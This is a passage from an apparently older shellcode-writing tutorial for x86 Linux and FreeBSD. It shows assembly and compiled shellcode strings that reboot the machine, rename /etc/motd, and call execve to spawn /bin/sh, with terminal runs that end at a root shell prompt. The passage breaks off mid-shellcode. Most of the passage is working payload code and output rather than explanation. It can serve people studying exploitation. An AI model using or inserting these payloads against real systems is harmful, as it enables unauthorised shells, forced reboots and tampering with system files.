<u>The NULL byte problem:</u></h2>

<pre>NULL bytes are string delimeters and kill shellcode. If you created shellcode
that contains such bytes: Don't bother using it and try to fix the problem.
So since you cannot have NULL bytes in the shellcode you will have to add them
at runtime. Now that we have seen in the above example how to get the location
of bytes in our string:

jmp short&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; stuff&nbsp;&nbsp;
code:

pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; esi
xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax,eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; <i>doing this will make eax NULL&nbsp;
</i>mov byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 17],al&nbsp;&nbsp; ; <i>put a null byte byte on [esi + 17]</i>&nbsp;&nbsp;

stuff:
call&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; code
db&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'This is my string#'
&nbsp;
In the above example we replace '#' with a NULL byte and terminate the string&nbsp;
'This is my string' at run time. For clean coding purposes it I find it the best
to alter you strings at the beginning of you assembly code.

Please note that NULL bytes are not the only problem! Other bytes such as newlines
and special characters can also cause problems !.</pre>

<h2>
<u>The syn() syn() reboot() examples :</u></h2>

<pre>Dont run this code on a production system ! Sync brings the hard disk state&nbsp;
of the file system in sync with the internal state of the file system. We have
to put this in front of the reboot() syscall to avoid loss of data that hasn't
been written by the harddisk on the file system. Using this code can ofcourse
still result in dataloss because active processes are *not* terminated properly&nbsp;
before the reboot. Since we don't need to alter any data in this code, their is
no need to find out from what location we are working:</pre>

<pre>BITS 32

pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; esi
xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax, eax
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al,36&nbsp;
int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al,36
int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al, 88
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ebx, 0xfee1dead&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ecx, 672274793
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; edx, 0x1234567
int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80</pre>

<pre>Shellcode produced by this assembly code:</pre>

<pre>[root@droopy doc]# nasm -o reboot reboot.S&nbsp;
[root@droopy doc]# s-proc -p reboot


char shellcode[] =
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x5e\x31\xc0\xb0\x24\xcd\x80\xb0\x24\xcd\x80\xb0\x58\xbb\xad"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xde\xe1\xfe\xb9\x69\x19\x12\x28\xba\x67\x45\x23\x01\xcd\x80";</pre>

<pre>The FreeBSD code for this is much simpler and doesn't require you to add sync()
in front of it:</pre>

<pre>BITS 32

xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax,eax
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dx,9998&nbsp;&nbsp;&nbsp;
sub&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dx,9990
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al, 55
int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80</pre>

<pre>The FreeBSD shellcode created by this code:

char shellcode[] =
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x31\xc0\x66\xba\x0e\x27\x66\x81\xea\x06\x27\xb0\x37\xcd\x80";</pre>

<pre>Additionally FreeBSD also has many more different flags for reboots which you can
use to do some funky stuff ;-) see:&nbsp; /usr/include/sys/reboot.h for more information.</pre>

<h2>
<u>The rename() example (linux):</u></h2>

<pre>The rename syscall looks like this (taken from 'man rename'):&nbsp;

int rename(const char *oldpath, const char *newpath);

So in order to use this syscall successful we need two pointers to our old&nbsp;
and new file. To get an adress from a string we can use 'lea' in assembly.&nbsp;

BITS 32

jmp short&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; callit

doit:&nbsp;&nbsp;&nbsp;
pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; esi
xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax, eax
mov byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 9], al&nbsp;&nbsp;&nbsp;&nbsp; ; <i>terminate arg 1&nbsp;
</i>mov byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 24], al&nbsp;&nbsp;&nbsp; ; <i>terminate arg 2&nbsp;
</i>mov byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al, 38&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; <i>the syscall rename = 83</i>&nbsp;
lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ebx, [esi]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; <i>put the address of /etc/motd (esi) in ebx
</i>lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ecx, [esi + 10]&nbsp;&nbsp; ; <i>put the address of /etc/ooops.txt (esi + 10) in ecx</i>&nbsp;
int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; <i>We have everything ready so lets call the kernel</i>&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al, 0x01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; <i>prepare to exit()
</i>xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ebx, ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; <i>clean up&nbsp;&nbsp;&nbsp;&nbsp;
</i>int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; <i>and exit !&nbsp;&nbsp;

</i>callit:
call&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; doit
db&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; '/etc/motd#/etc/ooops.txt#'

Please note that the 'db' line can also be formatted like this, it doesn't make any difference:

db&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; '/etc/motd#'
db&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; '/etc/ooops.txt#'

Shellcode produced from this assembly code, after we compiled it, will look like this:</pre>

<pre>char shellcode[] =
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xeb\x18\x5e\x31\xc0\x88\x46\x09\x88\x46\x18\xb0\x26\x8d\x1e"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x8d\x4e\x0a\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xe3\xff\xff"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xff\x2f\x65\x74\x63\x2f\x6d\x6f\x74\x64\x23\x2f\x65\x74\x63"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x2f\x6f\x6f\x6f\x70\x73\x2e\x74\x78\x74\x23";


</pre>

<h2>
<u>The execve examples number I (no arguments):</u></h2>

<pre>Execve is the almighty system call that can be used to execute a file. The&nbsp;
linux implementation looks like this:</pre>

<pre>int execve (const char *filename, char *const argv [], char *const envp[]);</pre>

<pre>So what we need is to get 3 pointers, one to our filename, one to the arguments
array and one to environment array. Since we are not interested in the environment
array we will use NULL for it. We will implement this execve as follows:</pre>

<pre>execve("pointer to string /bin/sh","pointer to /bin/sh","pointer to NULL");</pre>

<pre>BITS 32

jmp short&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; callit&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; <i>jmp trick as explained above

</i>doit:

pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; <i>esi now represents the location of our string
</i>xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax, eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; <i>make eax 0
</i>mov byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 7], al&nbsp;&nbsp;&nbsp;&nbsp; ; <i>terminate /bin/sh&nbsp;
</i>lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ebx, [esi]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; <i>get the adress of /bin/sh and put it in register ebx&nbsp;
</i>mov long&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 8], ebx&nbsp;&nbsp;&nbsp; ; <i>put the value of ebx (the address of /bin/sh) in AAAA ([esi +8])</i>&nbsp;
mov long&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 12], eax&nbsp;&nbsp; ; <i>put NULL in BBBB (remember xor eax, eax)</i>&nbsp;
mov byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al, 0x0b&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; <i>Execution time! we use syscall 0x0b which represents execve
</i>mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ebx, esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; <i>argument one... ratatata /bin/sh
</i>lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ecx, [esi + 8]&nbsp;&nbsp;&nbsp; ; <i>argument two... ratatata our pointer to /bin/sh
</i>lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; edx, [esi + 12]&nbsp;&nbsp; ; <i>argument three... ratataa our pointer to NULL
</i>int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80

callit:
call&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; doit&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; <i>part of the jmp trick to get the location of db

</i>db&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; '/bin/sh#AAAABBBB'</pre>

<pre>Note that the #AAAABBBB characters are not needed in the shellcode but removing them can have the result
that the the shellcode corrupts memory which causes it to fail. This assembly code can be used to create&nbsp;
the following shellcode:

char shellcode[] =
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23\x41\x41\x41\x41"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x42\x42\x42\x42";</pre>

<pre>In the above example syscall argument data is stored in the CPU registers (eax,ecx,edx etc).&nbsp;
This is the way how Linux likes it. On *BSD systems argument are given to system calls by pushing&nbsp;
them on the stack. Below is an example for an execve syscall on FreeBSD:</pre>

<pre>BITS 32

jmp short&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; callit
doit:

pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; esi
xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax, eax
mov byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 7], al
push&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax
push&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax
push&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; esi&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al,59
push&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax&nbsp;
int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80

callit:
call&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; doit

db&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; '/bin/sh'</pre>

<pre>And the result:</pre>

<pre>su-2.05a# s-proc -p execve


char shellcode[] =
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xeb\x0e\x5e\x31\xc0\x88\x46\x07\x50\x50\x56\xb0\x3b\x50\xcd"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x80\xe8\xed\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";


su-2.05a# s-proc -e execve
Calling code ...
#</pre>

<h2>
<u>The execve example number II (one argument, linux):</u></h2>

<pre>From the execve man page:

int execve (const char *filename, char *const argv [], char *const envp[]);

So we need a pointer to our file name, argument array and environment array. The
last called array may also be replaced with NULL and that is what we will do ;-)
Remember.. you can use execve for any program !&nbsp;
&nbsp;&nbsp;&nbsp;
BITS 32

jmp short&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; callit

doit:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; <i><u>Part one</u>: Manipulate the string defined after 'db'
</i>pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; esi now represents our string
xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax, eax&nbsp;&nbsp;&nbsp; ;&nbsp;&nbsp;
mov byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 7], al&nbsp;&nbsp;&nbsp; ; <i>put null byte after /bin/sh and ths terminate the string&nbsp;
</i>mov byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 10], al&nbsp;&nbsp; ; <i>ditto but then after -i

</i>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; <i><u>Part two</u>: Prepare the arguments for our system call</i>&nbsp;
mov long&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 11], esi&nbsp; ; <i>get address of /bin/sh and store it in AAAA&nbsp;
</i>lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ebx, [esi + 8]&nbsp;&nbsp; ; <i>get adress of -i and store it in ebp&nbsp;
</i>mov long&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 15], ebx&nbsp; ; <i>store the address in [esi + 15] -&gt; BBBBB
</i>mov long&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 19], eax&nbsp; ; <i>put NULL in CCCC&nbsp;

</i>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; <i><u>Part three</u>: Prepare execution and execute
</i>mov byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al, 0x0b&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; <i>0x0b is the execve system call
</i>mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ebx, esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; <i>ebx = argument 1
</i>lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ecx, [esi + 11]&nbsp; ; <i>arguments pointer
</i>lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; edx, [esi + 19]&nbsp; ; <i>environment pointer
</i>int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80

mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al, 0x01
xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ebx, ebx
int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80

callit:
call&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; doit

db&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; '/bin/sh#-i#AAAABBBBCCCC'


[root@droopy execve-2]# nasm -o execve execve.S&nbsp;
[root@droopy execve-2]# s-proc -p execve


char shellcode[] =
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xeb\x27\x5e\x31\xc0\x88\x46\x07\x88\x46\x0a\x89\x76\x0b\x8d"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x5e\x08\x89\x5e\x0f\x89\x46\x13\xb0\x0b\x89\xf3\x8d\x4e\x0b"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x8d\x56\x13\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xd4\xff\xff"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23\x2d\x69\x23\x41\x41\x41"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x41\x42\x42\x42\x42\x43\x43\x43\x43";


[root@droopy execve-2]# s-proc -e execve
Calling code ...
sh-2.04#</pre>

<h2>
<u>The execve example number III (2 &gt; arguments, linux):</u></h2>

<pre>Again we will use the following defenition:

int execve (const char *filename, char *const argv [], char *const envp[]);

And our goal is as follows:

int execve (AAAA,pointer to array AAAABBBBCCCC,DDDD);

BITS 32

jmp short&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; callit

doit:&nbsp;&nbsp;&nbsp;

pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; esi
xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax, eax
mov byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 7], al&nbsp;&nbsp;&nbsp;&nbsp; ; <i>terminate /bin/sh
</i>mov byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 10], al&nbsp;&nbsp;&nbsp; ; <i>terminate -c
</i>mov byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 18], al&nbsp;&nbsp;&nbsp; ; <i>terminate /bin/ls
</i>mov long&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 20], esi&nbsp;&nbsp; ; <i>address of /bin/sh in AAAA
</i>lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ebx, [esi + 8]&nbsp;&nbsp;&nbsp; ; <i>get address of -c&nbsp;&nbsp;
</i>mov long&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 24], ebx&nbsp;&nbsp; ; <i>store address of -c in BBBB</i>&nbsp;
lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ebx, [esi + 11]&nbsp;&nbsp; ; <i>get address of /bin/ls
</i>mov long&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 28], ebx&nbsp;&nbsp; ; <i>store address of /bin/ls in CCCC
</i>mov long&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 32], eax&nbsp;&nbsp; ; <i>put NULL in DDDD
</i>mov byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al, 0x0b&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; <i>prepare the execution, we use syscall 0x0b (execve)
</i>mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ebx, esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; <i>program&nbsp;
</i>lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ecx, [esi + 20]&nbsp;&nbsp; ; <i>argument array (/bin/sh -c /bin/ls)</i>&nbsp;
lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; edx, [esi + 32]&nbsp;&nbsp; ; <i>NULL
</i>int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; <i>call the kernel to look at our stuff ;-)

</i>callit:
call&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; doit

db&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; '/bin/sh#-c#/bin/ls#AAAABBBBCCCCDDDD'

[root@droopy execve-3]# s-proc -p execve


char shellcode[] =
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xeb\x2a\x5e\x31\xc0\x88\x46\x07\x88\x46\x0a\x88\x46\x12\x89"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x76\x14\x8d\x5e\x08\x89\x5e\x18\x8d\x5e\x0b\x89\x5e\x1c\x89"
